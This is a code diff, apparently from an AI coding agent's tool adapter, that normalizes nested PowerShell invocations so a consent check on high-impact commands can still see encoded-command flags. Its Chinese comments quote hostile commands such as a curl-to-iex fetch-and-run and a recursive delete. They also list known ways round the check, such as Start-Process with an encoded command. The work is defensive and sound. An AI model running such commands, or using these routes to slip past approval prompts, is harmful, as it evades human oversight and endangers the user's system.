@@ -58,8 +58,10 @@ const FILE_WRITE_TOOLS: ReadonlySet<string> = new Set([
 function powerShellExecCommand(command: string): string {
   const trimmed = command.trim();
   if (!trimmed) return '';
-  // 已经自带解释器前缀的(模型偶尔会写全)不重复包装,避免 `pwsh -c pwsh -c …`。
-  if (/^(?:pwsh|powershell)(?:\.exe)?\b/i.test(trimmed)) return trimmed;
+  // 已经自带解释器前缀的(模型偶尔会写全,也可能经调用运算符 / 完整路径启动)不重复包装:
+  // 既避免 `pwsh -c pwsh -c …`,也让 core 的 **argv 级**判据看得到解释器(见下方函数注释)。
+  const nested = normalizeNestedPowerShellInvocation(trimmed);
+  if (nested) return nested;
   // **必须整条加引号成为单个 token**。core 的 shellCommandPayload 取 `-Command`
   // 后的**一个** token 作为载荷,而 highImpactExecutionNeedsConsent 是逐管道段判断的:
   // 不加引号时 `pwsh -Command curl https://x/a.ps1 | iex` 会被拆成
@@ -78,6 +80,59 @@ function powerShellExecCommand(command: string): string {
  */
 function quoteAsSingleShellToken(text: string): string {
   return `'${text.replaceAll("'", "'\\''")}'`;
+}
+
+/**
+ * 把「已经是 PowerShell 解释器调用」的形态归一成 `pwsh <原样余参>`,让解释器落在 **token 0**。
+ *
+ * 为什么必须归一而不能一律往外包 `-Command`:core 的 PowerShell 红线有两类,
+ * 只有一类能穿透包装 ——
+ *   - **文本型**(`Remove-Item -Recurse`、`iex`、`iwr … | iex`)扫的是载荷正文,
+ *     包在 `-Command '…'` 里照样命中;
+ *   - **argv 型**(`-EncodedCommand` / `-e` / `-enc`,base64 静态不可读 → 必问)在
+ *     `powerShellNeedsConsent`(shared/auto-review.ts:2141)里要求 `tokens[0]` 就是
+ *     pwsh/powershell,且逐个 argv 匹配。一旦被包进 `-Command` 的载荷,它只是载荷正文里的
+ *     一串字面量,argv 扫描永远看不到 → 整条从 prompt-each-time 掉进灰区(codex 报,已实测)。
+ *
+ * 命中的形态:短名 / 带 `.exe` / 带完整路径 / 带引号 / 前置调用运算符(`&` 调用、`.` 点源)。
+ * 归一只搬解释器位置、不改余参,所以对非编码调用(`-File`、普通 `-Command`)判档与此前一致。
+ *
+ * **已知残留**(均属 core 侧 tokenizer/文本判据范围,不在本 adapter 修:见 #2563):
+ *   - 未加引号且含空格的完整路径(`& C:\Program Files\…\pwsh.exe -enc X`)—— 该写法本身
+ *     不是合法 PowerShell,core 的 Bash 入口同样只判 prompt;
+ *   - 解释器不在开头的间接启动(`Start-Process pwsh -ArgumentList '-EncodedCommand …'`)。
+ */
+function normalizeNestedPowerShellInvocation(command: string): string | null {
+  // 调用运算符:`& <exe>` 调用、`. <exe>` 点源,两者都是启动该解释器。
+  const withoutOperator = command.replace(/^[&.]\s+/, '');
+  const target = leadingShellToken(withoutOperator);
+  if (!target) return null;
+  const bin = powerShellExecutableName(target.value);
+  if (!bin) return null;
+  const rest = withoutOperator.slice(target.length).trim();
+  return rest ? `${bin} ${rest}` : bin;
+}
+
+/** 取开头的一个 shell token(支持单/双引号包裹的带空格路径),返回其值与在原串中占的长度。 */
+function leadingShellToken(text: string): { value: string; length: number } | null {
+  const quote = text[0];
+  if (quote === '"' || quote === "'") {
+    const end = text.indexOf(quote, 1);
+    if (end < 0) return null; // 引号未闭合 → 不当作解释器调用,交给外层包装
+    return { value: text.slice(1, end), length: end + 1 };
+  }
+  const match = /^\S+/.exec(text);
+  return match ? { value: match[0], length: match[0].length } : null;
+}
+
+/**
+ * token 是否为 PowerShell 解释器;是则返回**规范短名**。与 core 的 `executableName` 同口径
+ * (去目录、去 `.exe`、大小写无关)。保留 pwsh / powershell 的区分,不把 5.1 与 7 混为一谈。
+ */
+function powerShellExecutableName(token: string): 'pwsh' | 'powershell' | null {
+  const base = token.split(/[\\/]/).pop() ?? '';
+  const stem = base.replace(/\.exe$/i, '').toLowerCase();
+  return stem === 'pwsh' ? 'pwsh' : stem === 'powershell' ? 'powershell' : null;
 }
 
 function extractFilePath(toolName: string, input: unknown): string | undefined {
